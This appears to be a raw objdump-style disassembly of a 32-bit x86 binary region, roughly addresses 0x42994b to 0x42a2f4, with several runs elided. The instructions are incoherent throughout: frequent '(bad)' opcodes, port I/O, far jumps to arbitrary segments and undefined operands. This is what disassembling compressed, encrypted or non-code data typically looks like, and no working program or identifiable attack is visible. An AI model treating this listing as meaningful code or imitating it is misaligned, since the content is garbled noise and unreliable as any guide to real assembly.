  42994b:	test   al,0x9c
  42994d:	retf   0x3dfe
  429950:	or     BYTE PTR [ebx],0x20
  429953:	js     0x42993c
  429955:	xchg   ebx,eax
  429956:	mov    bh,0x26
  429958:	int    0xb5
  42995a:	and    DWORD PTR [edx-0x363489a7],0xffffffed
  429961:	adc    dl,BYTE PTR [eax+ebp*4]
  429964:	push   esi
  429965:	push   0x852c9df1
  42996a:	in     eax,0x92
  42996c:	cmp    ebx,0xffffffe8
  42996f:	popf   
  429970:	mov    bh,0x3a
  429972:	es and al,0xd7
  429975:	repz gs xchg edi,eax
  429978:	cmp    BYTE PTR [esi],0x8d
  42997b:	inc    ebp
  42997c:	fistp  WORD PTR [ecx+edi*1-0x6610f45a]
  429983:	sub    bl,bh
  429985:	(bad)  
  429986:	scas   eax,DWORD PTR es:[edi]
  429987:	cmp    al,0xc6
  429989:	pop    ss
  42998a:	pop    ebp
  42998b:	pop    ebp
  42998c:	jp     0x4299d3
  42998e:	adc    al,0xa8
  429990:	xchg   esp,eax
  429991:	cdq    
  429992:	push   ebp
  429993:	lods   al,BYTE PTR ds:[esi]
  429994:	mov    cl,0xd5
  429996:	das    
  429997:	pusha  
  429998:	mov    esp,0x74a2823e
  42999d:	out    0xb8,eax
  42999f:	ins    BYTE PTR es:[edi],dx
  4299a0:	ret    0xa10e
  4299a3:	cmp    BYTE PTR [eax],ch
  4299a5:	xor    esp,DWORD PTR [esp+eax*8-0x71]
  4299a9:	mov    dh,0xe0
  4299ab:	inc    ebx
  4299ac:	jmp    0x429a07
  4299ae:	inc    eax
  4299af:	(bad)  
  4299b0:	fstp   DWORD PTR [edi-0x60]
  4299b3:	lahf   
  4299b4:	outs   dx,BYTE PTR ds:[esi]
  4299b5:	add    al,0xa
  4299b7:	sub    DWORD PTR [eax+0x58],ecx
  4299ba:	pop    ebx
  4299bb:	mov    dl,0x99
  4299bd:	sub    bl,ah
  4299bf:	jae    0x4299c3
  4299c1:	jle    0x429989
  4299c3:	lock push esp
  4299c5:	inc    edi
  4299c6:	adc    al,0x49
  4299c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4299c9:	xchg   edx,eax
  4299ca:	jg     0x4299e0
  4299cc:	xlat   BYTE PTR ds:[ebx]
  4299cd:	fimul  DWORD PTR [esp+esi*4]
  4299d0:	inc    eax
  4299d1:	adc    eax,0x83f9e973
  4299d6:	sub    WORD PTR [esi+0x648f800c],0xffbb
  4299de:	xchg   edx,eax
  4299df:	lock push ds
  4299e1:	add    eax,0x49bc8c01
  4299e6:	or     al,0xaf
  4299e8:	lods   eax,DWORD PTR ds:[esi]
  4299e9:	push   0xffffffe0
  4299eb:	jb     0x429997
  4299ed:	cmp    edx,edi
  4299ef:	loope  0x4299b6
  4299f1:	pop    ebx
  4299f2:	push   ecx
  4299f3:	loope  0x429a65
  4299f5:	in     eax,dx
  4299f6:	xchg   ecx,eax
  4299f7:	je     0x429a20
  4299f9:	fnstcw WORD PTR [ebx]
  4299fb:	cld    
  4299fc:	call   0x808d:0x6ae6d2c9
  429a03:	mov    BYTE PTR [esi-0x2a95e553],al
  429a09:	stos   BYTE PTR es:[edi],al
  429a0a:	outs   dx,BYTE PTR ds:[esi]
  429a0b:	(bad)  [eax+0x3854e699]
  429a11:	sbb    al,0xd1
  429a13:	int3   
  429a14:	add    DWORD PTR [esi+ebx*8+0x1f],ebp
  429a18:	mov    WORD PTR [bp+0x2c],?
  429a1c:	pop    es
  429a1d:	mov    BYTE PTR [edi+edi*4],ah
  429a20:	outs   dx,DWORD PTR ds:[esi]
  429a21:	ins    BYTE PTR es:[edi],dx
  429a22:	mov    ebx,0xff59fda
  429a27:	in     al,0xe2
  429a29:	mov    ah,0x16
  429a2b:	pop    ebx
  429a2c:	push   ebp
  429a2d:	push   ecx
  429a2e:	jge    0x429a27
  429a30:	jbe    0x429a90
  429a32:	cmp    BYTE PTR [edx+0x3c],bh
	...
  429a94:	add    BYTE PTR [eax],al
  429a96:	into   
  429a97:	std    
  429a98:	sti    
  429a99:	leave  
  429a9a:	sti    
  429a9b:	iret   
  429a9c:	(bad)  
  429a9d:	jmp    DWORD PTR [ecx]
  429a9f:	dec    eax
  429aa0:	mov    edi,0xd617c513
  429aa5:	int3   
  429aa6:	inc    ebp
  429aa7:	mov    ebp,0x1070001
  429aac:	add    BYTE PTR [eax],al
  429aae:	mov    eax,0xf403fc0b
  429ab3:	int3   
  429ab4:	fwait
  429ab5:	mov    ebp,0x573c2d9d
  429aba:	mov    al,0x8c
  429abc:	fs jo  0x429ac8
  429abf:	test   BYTE PTR [edx+ebp*2],ah
  429ac2:	adc    BYTE PTR [edx+0x34],0xa1
  429ac6:	cmp    DWORD PTR [ecx],edi
  429ac8:	inc    ebp
  429ac9:	sub    BYTE PTR [ebp+0x2eac1bac],cl
  429acf:	xchg   esp,eax
  429ad0:	mov    ds:0x52452b7,al
  429ad5:	stos   BYTE PTR es:[edi],al
  429ad6:	xor    dh,bl
  429ad8:	popa   
  429ad9:	jns    0x429ab7
  429adb:	pop    edx
  429adc:	sub    esi,DWORD PTR [ebx+0x34]
  429adf:	xor    al,0xe2
  429ae1:	scas   al,BYTE PTR es:[edi]
  429ae2:	cmp    eax,esi
  429ae4:	in     eax,dx
  429ae5:	adc    edi,eax
  429ae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ae8:	mov    esi,0x1d3710cd
  429aed:	and    esi,DWORD PTR [edx+0x29966fde]
  429af3:	pop    eax
  429af4:	jl     0x429b11
  429af6:	xlat   BYTE PTR ds:[ebx]
  429af7:	xchg   DWORD PTR [eax-0x7dcc87f5],ebp
  429afd:	shl    BYTE PTR [esi+esi*8-0x5c],0xe5
  429b02:	adc    BYTE PTR [ebp+0x1c2af441],bl
  429b08:	pop    edi
  429b09:	cmp    BYTE PTR [eax],0x87
  429b0c:	daa    
  429b0d:	add    bh,BYTE PTR [edx+0x3661b0bc]
  429b13:	jle    0x429ab2
  429b15:	cmp    BYTE PTR [edx],0xdb
  429b18:	inc    ebp
  429b19:	add    bl,cl
  429b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b1c:	and    eax,0xe5ba6f84
  429b21:	push   edx
  429b22:	pop    ebx
  429b23:	mov    bl,0xff
  429b25:	mov    ch,0x33
  429b27:	and    DWORD PTR [ebp+0x2b9189c2],ebp
  429b2d:	fisub  DWORD PTR [esi+0x24a5c8dd]
  429b33:	jmp    0xdb86:0x6907e551
  429b3a:	repnz sbb DWORD PTR [esi+0xbb63946],edx
  429b41:	call   0x5daf:0x92d2ff03
  429b48:	jmp    0x3e5d:0x3fc30d5a
  429b4f:	push   ss
  429b50:	jge    0x429ae6
  429b52:	pusha  
  429b53:	jbe    0x429b14
  429b55:	call   0xd6e555fb
  429b5a:	mov    ds:0xeb86ee10,al
  429b5f:	cmp    cl,BYTE PTR [eax+0x32ab6a9a]
  429b65:	xchg   esp,eax
  429b66:	ins    DWORD PTR es:[edi],dx
  429b67:	out    dx,eax
  429b68:	pop    eax
  429b69:	jb     0x429b61
  429b6b:	mov    dl,0x50
  429b6d:	ret    
  429b6e:	clc    
  429b6f:	in     al,dx
  429b70:	or     BYTE PTR [ebx],0x8
  429b73:	push   0x6f067f95
  429b78:	mov    bh,0x2a
  429b7a:	shr    BYTE PTR [esi+edi*1],0xfc
  429b7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b7f:	adc    eax,DWORD PTR [eax]
  429b81:	add    ecx,eax
  429b83:	enter  0x6a9a,0xc1
  429b87:	push   ecx
  429b88:	stos   BYTE PTR es:[edi],al
  429b89:	push   cs
  429b8a:	xchg   ebx,eax
  429b8b:	adc    eax,0x8023377
  429b90:	stos   DWORD PTR es:[edi],eax
  429b91:	mov    al,ds:0x1bcc67f4
  429b96:	add    eax,0xb2bb3749
  429b9b:	inc    ebp
  429b9c:	pusha  
  429b9d:	(bad)  
  429b9e:	loope  0x429be5
  429ba0:	or     esp,esp
  429ba2:	or     al,0xca
  429ba4:	mov    DWORD PTR [edi],ebx
  429ba6:	xor    BYTE PTR [ebp+0x72],dl
  429ba9:	push   ebp
  429baa:	push   esi
  429bab:	out    dx,eax
  429bac:	fsub   QWORD PTR [edi+0x369947d3]
  429bb2:	ror    DWORD PTR [edx+eiz*2+0x0],cl
	...
  429c16:	mov    ds:0xb788a616,eax
  429c1b:	mov    eax,0x52a3faf
  429c20:	xchg   esp,eax
  429c21:	pop    eax
  429c22:	rcr    esp,1
  429c24:	push   es
  429c25:	arpl   WORD PTR [esi+edi*4+0x1],cx
  429c29:	add    BYTE PTR [edi],al
  429c2b:	add    DWORD PTR [eax],eax
  429c2d:	add    BYTE PTR [ebp-0x9e0a81],al
  429c33:	jge    0x429c94
  429c35:	retf   
  429c36:	pop    ebx
  429c37:	(bad)  
  429c38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c39:	cmp    BYTE PTR [ecx],cl
  429c3b:	cmp    dh,BYTE PTR [eax+edx*1-0x79b4805b]
  429c42:	cwde   
  429c43:	mov    ds:0xb7bc02d4,eax
  429c48:	adc    ch,bh
  429c4a:	aas    
  429c4b:	mov    dh,0xff
  429c4d:	(bad)  
  429c4e:	scas   eax,DWORD PTR es:[edi]
  429c4f:	daa    
  429c50:	sub    BYTE PTR [eax-0x79],bl
  429c53:	jle    0x429c46
  429c55:	xor    ebp,DWORD PTR [ebx]
  429c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c58:	pop    es
  429c59:	data16 mov dh,0xfc
  429c5c:	mov    ch,0x8f
  429c5e:	mov    ch,0xc8
  429c60:	iret   
  429c61:	jmp    0x429cc4
  429c63:	in     eax,dx
  429c64:	jne    0x429c74
  429c66:	dec    DWORD PTR [ecx-0x3]
  429c69:	or     eax,0xb18e6c4c
  429c6e:	into   
  429c6f:	push   esi
  429c70:	or     al,0x78
  429c72:	cmc    
  429c73:	jns    0x429c99
  429c75:	push   ss
  429c76:	jno    0x429c65
  429c78:	test   DWORD PTR [esp+eax*1],edx
  429c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c7c:	ret    
  429c7d:	pop    ecx
  429c7e:	xor    eax,0x2726653f
  429c83:	sahf   
  429c84:	shl    ebx,0x59
  429c87:	mov    edx,0x61221e26
  429c8c:	cmp    ecx,DWORD PTR [esi]
  429c8e:	push   cs
  429c8f:	leave  
  429c90:	jb     0x429c2e
  429c92:	sbb    dl,BYTE PTR [ebx+0x34d48838]
  429c98:	inc    bh
  429c9a:	je     0x429ced
  429c9c:	sub    BYTE PTR [ecx],dl
  429c9e:	xchg   ebx,eax
  429c9f:	adc    BYTE PTR [ebp+0x39],bl
  429ca2:	push   es
  429ca3:	add    edi,ebx
  429ca5:	into   
  429ca6:	ror    BYTE PTR [edx-0x31dc9601],0x51
  429cad:	retf   0xb611
  429cb0:	(bad)  
  429cb1:	xor    eax,0x2f4e34e2
  429cb6:	jp     0x429cf7
  429cb8:	inc    ecx
  429cb9:	inc    ebp
  429cba:	xor    bl,dh
  429cbc:	rcr    DWORD PTR [eax-0x4c],1
  429cbf:	jle    0x429cd8
  429cc1:	mov    eax,0x49943756
  429cc6:	add    bh,BYTE PTR [esi+0x474997a6]
  429ccc:	nop
  429ccd:	pop    ds
  429cce:	add    eax,0x36e47148
  429cd3:	xor    eax,DWORD PTR [edx]
  429cd5:	js     0x429d54
  429cd7:	shl    DWORD PTR [ebx+0x18],cl
  429cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429cdb:	adc    eax,0xc86ca4ea
  429ce0:	sbb    al,0xa0
  429ce2:	ins    BYTE PTR es:[edi],dx
  429ce3:	add    BYTE PTR [ebx-0x7a43c267],cl
  429ce9:	arpl   WORD PTR [edi],dx
  429ceb:	adc    DWORD PTR [edi+0x14],edi
  429cee:	or     eax,0x5b84e788
  429cf3:	sbb    dh,dh
  429cf5:	(bad)
  429cf8:	adc    al,0x80
  429cfa:	or     ebp,eax
  429cfc:	test   BYTE PTR ds:0xbfdd1dae,bl
  429d02:	jmp    0x429d52
  429d04:	std    
  429d05:	and    BYTE PTR [edi],0x5a
  429d08:	icebp  
  429d09:	(bad)  
  429d0a:	es (bad) 
  429d0c:	mov    ebp,0xdf4ce17b
  429d11:	sbb    al,0x4e
  429d13:	lahf   
  429d14:	sti    
  429d15:	and    ch,bh
  429d17:	mov    WORD PTR [ebx],cs
  429d19:	data16 jnp 0x429d69
  429d1c:	loopne 0x429d0c
  429d1e:	xlat   BYTE PTR ds:[ebx]
  429d1f:	loop   0x429d3d
  429d21:	rcr    DWORD PTR [edi-0x34],1
  429d24:	sahf   
  429d25:	shl    BYTE PTR [ebp+0x59],0xa4
  429d29:	sub    edi,DWORD PTR [ecx+0x676c6409]
  429d2f:	nop
  429d30:	mov    ds,WORD PTR [edi+0x3a]
  429d33:	scas   al,BYTE PTR es:[edi]
  429d34:	mov    dh,0x0
	...
  429d96:	fwait
  429d97:	mov    bh,0xc4
  429d99:	or     al,0xec
  429d9b:	jg     0x429d78
  429d9d:	mov    bh,0xb8
  429d9f:	xor    al,0xdf
  429da1:	sub    eax,0x677c770d
  429da6:	push   ebx
  429da7:	mov    edi,0x1070001
  429dac:	add    BYTE PTR [eax],al
  429dae:	repnz (bad) 
  429db0:	icebp  
  429db1:	call   0x48729fd2
  429db6:	je     0x429d96
  429db8:	test   al,0xc3
  429dba:	pop    es
  429dbb:	fidivr DWORD PTR [edx+0x43]
  429dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429dbf:	out    dx,eax
  429dc0:	out    0xd8,al
  429dc2:	lea    ebp,[eax+0x61]
  429dc5:	jo     0x429da1
  429dc7:	sub    DWORD PTR [edi],ecx
  429dc9:	jae    0x429e24
  429dcb:	and    al,0xfd
  429dcd:	jp     0x429e10
  429dcf:	mov    dl,0x40
  429dd1:	mov    cl,BYTE PTR [edx-0x7e]
  429dd4:	push   ebp
  429dd5:	aas    
  429dd6:	pusha  
  429dd7:	imul   eax,DWORD PTR [esi+0x5d45894c],0x4f
  429dde:	sbb    al,0x5e
  429de0:	fisttp DWORD PTR [ebx+0x4d3138f0]
  429de6:	dec    edx
  429de7:	mov    al,ds:0x1b4a6cee
  429dec:	and    DWORD PTR [ebx-0x13b61703],esi
  429df2:	sub    al,0x7e
  429df4:	mov    edi,0xb0985c7d
  429df9:	das    
  429dfa:	pusha  
  429dfb:	dec    ebp
  429dfc:	mov    ah,0xc1
  429dfe:	mov    dh,0xdd
  429e00:	jg     0x429dcf
  429e02:	shl    DWORD PTR [eax+0x32],cl
  429e05:	mov    esp,0x5c8a8e
  429e0a:	inc    esi
  429e0b:	pop    esi
  429e0c:	mov    esp,0x8dd31bd
  429e11:	xor    dh,BYTE PTR [edi-0x20]
  429e14:	jno    0x429de2
  429e16:	mov    cl,0xfc
  429e18:	iret   
  429e19:	aas    
  429e1a:	pop    ds
  429e1b:	(bad)
  429e1f:	fmul   st,st(7)
  429e21:	add    BYTE PTR [edx+0x6e0898fd],dh
  429e27:	stc    
  429e28:	adc    eax,0xede26ea7
  429e2d:	xor    BYTE PTR [edi-0x39],al
  429e30:	mov    ebx,0xd56bbbc3
  429e35:	add    BYTE PTR [ecx],bh
  429e37:	cmp    BYTE PTR [ebx],ch
  429e39:	jl     0x429e8e
  429e3b:	outs   dx,BYTE PTR ds:[esi]
  429e3c:	inc    eax
  429e3d:	xchg   esp,eax
  429e3e:	loope  0x429eaa
  429e40:	fldcw  WORD PTR [eax+0x12877b43]
  429e46:	push   ds
  429e47:	mov    eax,0x36cbed11
  429e4c:	xlat   BYTE PTR ds:[ebx]
  429e4d:	xchg   esp,eax
  429e4e:	aas    
  429e4f:	inc    edi
  429e50:	shr    DWORD PTR [ebp+0x56],1
  429e53:	dec    eax
  429e54:	mov    esp,0x5e14068b
  429e59:	cwde   
  429e5a:	scas   eax,DWORD PTR es:[edi]
  429e5b:	pushf  
  429e5c:	jbe    0x429e1f
  429e5e:	mov    ds:0x49e84ed9,eax
  429e63:	mov    dh,0x7a
  429e65:	pop    ebx
  429e66:	and    BYTE PTR [edi-0x81aca7c],0x3b
  429e6d:	dec    edi
  429e6e:	mov    edx,0x76f745e7
  429e73:	pop    eax
  429e74:	not    ah
  429e76:	enter  0x193d,0x31
  429e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e7c:	xchg   DWORD PTR [eax+0x6e],ecx
  429e7f:	lods   eax,DWORD PTR ds:[esi]
  429e80:	pusha  
  429e81:	out    0x2,al
  429e83:	inc    ebx
  429e84:	push   ss
  429e85:	test   eax,0x5d8c3ad5
  429e8a:	adc    DWORD PTR [ecx],esp
  429e8c:	pop    eax
  429e8d:	(bad)  
  429e8e:	lea    eax,[ebp-0x23a2bbf6]
  429e94:	pop    eax
  429e95:	pop    es
  429e96:	xor    esi,DWORD PTR [eax-0x5d]
  429e99:	clc    
  429e9a:	ins    BYTE PTR es:[edi],dx
  429e9b:	adc    ah,BYTE PTR [ecx]
  429e9d:	int    0x1f
  429e9f:	ret    
  429ea0:	adc    ebx,ecx
  429ea2:	loope  0x429eac
  429ea4:	add    eax,0x46101cb9
  429ea9:	mov    edx,DWORD PTR ds:[esi+0x6aaea435]
  429eb0:	sbb    eax,0x743e45e1
	...
  429f15:	add    BYTE PTR [ecx],dh
  429f17:	inc    ebp
  429f18:	enter  0xfc06,0x8f
  429f1c:	push   DWORD PTR [edi+0x54]
  429f1f:	into   
  429f20:	fnstcw WORD PTR ds:0xf0b23c9
  429f26:	pop    edx
  429f27:	rol    BYTE PTR [ecx],0x0
  429f2a:	pop    es
  429f2b:	add    DWORD PTR [eax],eax
  429f2d:	add    BYTE PTR [edi+0x1f6695d3],cl
  429f33:	fs addr16 push ebp
  429f36:	mul    BYTE PTR [esp+ebp*8+0x4d]
  429f3a:	jbe    0x429ebe
  429f3c:	jb     0x429f9f
  429f3e:	ds inc esp
  429f40:	test   BYTE PTR [edx-0x2d7c1f56],bl
  429f46:	push   ds
  429f47:	xchg   ebx,eax
  429f48:	lods   al,BYTE PTR ds:[esi]
  429f49:	inc    edx
  429f4a:	std    
  429f4b:	inc    ebx
  429f4c:	in     al,dx
  429f4d:	into   
  429f4e:	and    BYTE PTR [ebp+ecx*8+0x33eee8f9],bl
  429f55:	sbb    ebp,DWORD PTR [eax]
  429f57:	popf   
  429f58:	adc    ecx,ecx
  429f5a:	je     0x429fcd
  429f5c:	or     eax,DWORD PTR [ecx]
  429f5e:	xchg   ebp,eax
  429f5f:	das    
  429f60:	cmp    eax,0x74a0d241
  429f65:	cmp    ch,al
  429f67:	xchg   cl,cl
  429f69:	push   ecx
  429f6a:	jmp    0x429f47
  429f6c:	jp     0x429f5b
  429f6e:	lds    eax,FWORD PTR [edi+0x14da7379]
  429f74:	pop    ecx
  429f75:	icebp  
  429f76:	(bad)  
  429f77:	and    al,0xa0
  429f79:	ja     0x429f2b
  429f7b:	sbb    al,0xf4
  429f7d:	xor    eax,esi
  429f7f:	imul   ebp,DWORD PTR [ecx+0x2b],0xffffffa4
  429f83:	mov    ebp,0x8dc601d1
  429f88:	lea    esi,[edi+0x43]
  429f8b:	or     eax,0x1cfbf336
  429f90:	fwait
  429f91:	(bad)  
  429f92:	out    0x71,al
  429f94:	enter  0xf6ff,0xec
  429f98:	jge    0x429f4d
  429f9a:	inc    eax
  429f9b:	dec    edi
  429f9c:	mov    ecx,ecx
  429f9e:	add    al,0x31
  429fa0:	cmp    DWORD PTR [ebx-0xc],ecx
  429fa3:	and    eax,0x684697de
  429fa8:	sub    cl,dh
  429faa:	nop
  429fab:	out    dx,eax
  429fac:	cdq    
  429fad:	sbb    ecx,0x5f
  429fb0:	call   0x1a8fedc2
  429fb5:	cmp    al,0x75
  429fb7:	dec    edx
  429fb8:	inc    ebp
  429fb9:	stos   BYTE PTR es:[edi],al
  429fba:	repz xor edx,esp
  429fbd:	aam    0x68
  429fbf:	jnp    0x429fc6
  429fc1:	and    BYTE PTR [edi+ecx*4-0x7c26f47c],ch
  429fc8:	push   eax
  429fc9:	inc    ebx
  429fca:	js     0x42a00a
  429fcc:	push   0xefa3c87c
  429fd1:	inc    ebx
  429fd2:	dec    ecx
  429fd3:	loopne 0x429fd1
  429fd5:	mov    fs,WORD PTR [edi]
  429fd7:	push   ss
  429fd8:	mov    cs,WORD PTR [edi+0x12]
  429fdb:	cld    
  429fdc:	test   BYTE PTR ds:0xe33d6a47,bl
  429fe2:	mov    bl,0xe8
  429fe4:	push   ecx
  429fe5:	add    eax,0x5c83e47f
  429fea:	loop   0x429f75
  429fec:	push   ebp
  429fed:	add    cl,ch
  429fef:	mov    edx,0xbdb27235
  429ff4:	pop    eax
  429ff5:	ret    
  429ff6:	push   esi
  429ff7:	scas   al,BYTE PTR es:[edi]
  429ff8:	cdq    
  429ff9:	into   
  429ffa:	in     eax,0xf1
  429ffc:	call   DWORD PTR [eax]
  429ffe:	mov    bl,0x90
  42a000:	arpl   WORD PTR [edi],ax
  42a002:	sbb    bh,bh
  42a004:	mov    eax,ds:0x1a425f52
  42a009:	jno    0x42a04f
  42a00b:	xchg   esp,eax
  42a00c:	or     BYTE PTR [ebx],cl
  42a00e:	sahf   
  42a00f:	fmul   DWORD PTR [esi+0x174fae8]
  42a015:	inc    esp
  42a016:	clc    
  42a017:	xor    edi,DWORD PTR [edi+ecx*1+0x63]
  42a01b:	popa   
  42a01c:	dec    ebp
  42a01d:	adc    al,0xb2
  42a01f:	test   BYTE PTR [esi*1+0x1adc50c3],0x19
  42a027:	pusha  
  42a028:	mov    edx,0x65b2a7b0
  42a02d:	pop    ebx
  42a02e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a02f:	xor    al,0x12
  42a031:	or     BYTE PTR [edi+0x27],0xcb
	...
  42a095:	add    bh,dl
  42a097:	pushf  
  42a098:	shr    BYTE PTR [ebp-0x1000235],0x30
  42a09f:	xchg   esi,eax
  42a0a0:	mov    esi,0x89e1d94e
  42a0a5:	out    dx,al
  42a0a6:	popa   
  42a0a7:	rol    DWORD PTR [ecx],0x0
  42a0aa:	pop    es
  42a0ab:	add    DWORD PTR [eax],eax
  42a0ad:	add    BYTE PTR [eax+eiz*2+0x1e],ch
  42a0b1:	xchg   BYTE PTR ds:0x133a4ed5,ah
  42a0b7:	jg     0x42a0db
  42a0b9:	dec    esi
  42a0ba:	adc    BYTE PTR [ebx],ah
  42a0bc:	mov    bl,0x44
  42a0be:	adc    al,0x88
  42a0c0:	pop    ebp
  42a0c1:	inc    eax
  42a0c2:	fwait
  42a0c3:	cmp    esp,0x23
  42a0c6:	ja     0x42a141
  42a0c8:	popa   
  42a0c9:	fucom  st(0)
  42a0cb:	adc    al,0x68
  42a0ce:	iret   
  42a0cf:	xchg   ecx,eax
  42a0d0:	in     al,dx
  42a0d1:	dec    ebx
  42a0d2:	sbb    cl,cl
  42a0d4:	jg     0x42a09c
  42a0d6:	xor    cl,cl
  42a0d8:	mov    eax,ds:0x2ceb348e
  42a0dd:	in     al,dx
  42a0de:	jp     0x42a0d6
  42a0e0:	sub    cl,ch
  42a0e2:	pop    ebp
  42a0e3:	and    eax,0x95a53e64
  42a0e8:	sub    bl,BYTE PTR [edi+0x47783f6c]
  42a0ee:	in     eax,0xda
  42a0f0:	push   esp
  42a0f1:	push   cs
  42a0f2:	loope  0x42a164
  42a0f4:	aam    0xb8
  42a0f6:	fdivr  QWORD PTR [edx]
  42a0f8:	sub    ebp,esi
  42a0fa:	aas    
  42a0fb:	lahf   
  42a0fc:	mov    ecx,0xda976cac
  42a101:	iret   
  42a102:	cmp    al,0x9d
  42a104:	push   ss
  42a105:	adc    eax,0xfff55ab3
  42a10a:	sub    eax,0xa77e873
  42a10f:	and    al,0x28
  42a111:	test   eax,0x227cc3dd
  42a116:	nop
  42a117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a118:	inc    ecx
  42a119:	daa    
  42a11a:	and    al,0xa0
  42a11c:	aaa    
  42a11d:	fistp  QWORD PTR [eax+0x61fab6ad]
  42a123:	popa   
  42a124:	aaa    
  42a125:	test   eax,0xa79607dc
  42a12a:	lods   al,BYTE PTR ds:[esi]
  42a12b:	jno    0x42a15f
  42a12d:	les    eax,FWORD PTR [eax+0x78]
  42a130:	repnz cmc 
  42a132:	jo     0x42a0e8
  42a134:	dec    edx
  42a135:	(bad)  
  42a136:	fwait
  42a137:	sti    
  42a138:	jmp    0x9156328c
  42a13d:	pop    ss
  42a13e:	xlat   BYTE PTR ds:[ebx]
  42a13f:	and    eax,0xe87d7425
  42a144:	int    0xae
  42a146:	retf   
  42a147:	adc    eax,0x72f938ef
  42a14c:	add    al,0xec
  42a14e:	dec    ebx
  42a14f:	cwde   
  42a150:	cmp    bl,bh
  42a152:	xor    ebx,DWORD PTR [edx+0xc]
  42a155:	xchg   esp,eax
  42a156:	arpl   WORD PTR [esi-0x1],dx
  42a159:	out    dx,al
  42a15a:	loop   0x42a1a7
  42a15c:	and    bh,BYTE PTR [eax]
  42a15e:	push   edx
  42a15f:	pop    ss
  42a160:	pop    ebp
  42a161:	sbb    DWORD PTR [ebp+0x31f41f38],edx
  42a167:	aad    0xc7
  42a169:	adc    DWORD PTR [ebp+ecx*2-0xa],ecx
  42a16d:	iretw  
  42a16f:	jno    0x42a156
  42a171:	dec    esi
  42a172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a173:	je     0x42a155
  42a175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a176:	add    ebx,ecx
  42a178:	out    0x45,eax
  42a17a:	xor    al,0xb8
  42a17c:	shr    DWORD PTR [ebx+0x6e],0xdf
  42a180:	bound  eax,QWORD PTR [esi+edi*1-0x1b77127b]
  42a187:	sbb    esi,ebx
  42a189:	pop    es
  42a18a:	lahf   
  42a18b:	mov    edi,0xf545b68d
  42a190:	repz or eax,0x9dbb2210
  42a196:	xchg   edi,ecx
  42a198:	jnp    0x42a1c9
  42a19a:	enter  0xe3e2,0xf1
  42a19e:	sbb    al,dh
  42a1a0:	ret    0x9dba
  42a1a3:	inc    edi
  42a1a4:	mov    eax,0x418f7021
  42a1a9:	out    dx,al
  42a1aa:	mov    cs,WORD PTR [eax+0x45d16bab]
  42a1b0:	mov    eax,ebp
  42a1b2:	xor    ebp,DWORD PTR [ebx]
  42a1b4:	mov    eax,ds:0x0
	...
  42a215:	add    BYTE PTR [ebx],ch
  42a217:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a21d:	mov    bh,0x15
  42a21f:	fucomip st,st(5)
  42a221:	imul   edi,DWORD PTR [eax+0x73],0xc268e830
  42a228:	add    DWORD PTR [eax],eax
  42a22a:	pop    es
  42a22b:	add    DWORD PTR [eax],eax
  42a22d:	add    BYTE PTR [esi-0x7ad2fa27],dh
  42a233:	xchg   ebp,eax
  42a234:	push   0x33cc83b
  42a239:	cmp    eax,0x62586dbc
  42a23e:	aam    0x33
  42a240:	gs clc 
  42a242:	mov    WORD PTR [ecx+0x3b],ds
  42a245:	mov    DWORD PTR [eax],edi
  42a247:	dec    eax
  42a248:	sbb    al,0x9f
  42a24a:	stos   DWORD PTR es:[edi],eax
  42a24b:	fistp  DWORD PTR [edx-0x57b148cd]
  42a251:	jno    0x42a205
  42a253:	cmp    edx,0xffffffb7
  42a256:	push   esp
  42a257:	int    0xf4
  42a259:	call   0x3d88:0xb5bc45d9
  42a260:	sub    eax,0xa37211de
  42a265:	rcr    DWORD PTR [edx+eiz*2-0x11afb28a],cl
  42a26c:	cs mov edi,0xcbf4229d
  42a272:	mov    esi,0x30e602a5
  42a277:	add    al,0x95
  42a279:	mov    esi,0x71eddf02
  42a27e:	pop    esp
  42a27f:	or     eax,0xd6b65c89
  42a284:	add    eax,0xd7304813
  42a289:	bound  esp,QWORD PTR [edx]
  42a28b:	sbb    al,0x28
  42a28d:	clc    
  42a28e:	pop    eax
  42a28f:	aad    0x35
  42a291:	mov    esp,0xcd90e288
  42a296:	loopne 0x42a237
  42a298:	aad    0x38
  42a29a:	jle    0x42a2d6
  42a29c:	out    dx,al
  42a29d:	lahf   
  42a29e:	icebp  
  42a29f:	adc    BYTE PTR [ecx-0x17],0x94
  42a2a3:	jns    0x42a2ff
  42a2a5:	dec    si
  42a2a7:	sbb    eax,0x9761b971
  42a2ac:	cmc    
  42a2ad:	test   BYTE PTR [edx-0x154e8824],ch
  42a2b3:	or     ebp,DWORD PTR [esp+eax*2]
  42a2b6:	pop    esp
  42a2b7:	mov    ?,edx
  42a2b9:	push   eax
  42a2ba:	scas   eax,DWORD PTR es:[edi]
  42a2bb:	mov    dl,0xb2
  42a2bd:	dec    edi
  42a2be:	jns    0x42a262
  42a2c0:	push   0x58e5a6f0
  42a2c5:	jmp    0x76bf2c38
  42a2ca:	rol    DWORD PTR [eax],0x6d
  42a2cd:	scas   eax,DWORD PTR es:[edi]
  42a2ce:	xchg   BYTE PTR [edx],al
  42a2d0:	sbb    esp,esi
  42a2d2:	lods   al,BYTE PTR ds:[esi]
  42a2d3:	pop    esi
  42a2d4:	hlt    
  42a2d5:	out    dx,eax
  42a2d6:	mov    ecx,0x75d2531e
  42a2db:	or     BYTE PTR [ecx],al
  42a2dd:	cmp    ah,BYTE PTR [edi]
  42a2df:	jecxz  0x42a2d1
  42a2e1:	rcr    dl,cl
  42a2e3:	fcom   DWORD PTR [edx+0x67]
  42a2e6:	aaa    
  42a2e7:	int3   
  42a2e8:	out    0x4b,al
  42a2ea:	fadd   DWORD PTR [edi+0x50]
  42a2ed:	clc    
  42a2ee:	not    BYTE PTR [ecx+edx*8+0x3b]
  42a2f2:	mov    al,0x99
  42a2f4:	xchg   esi,eax
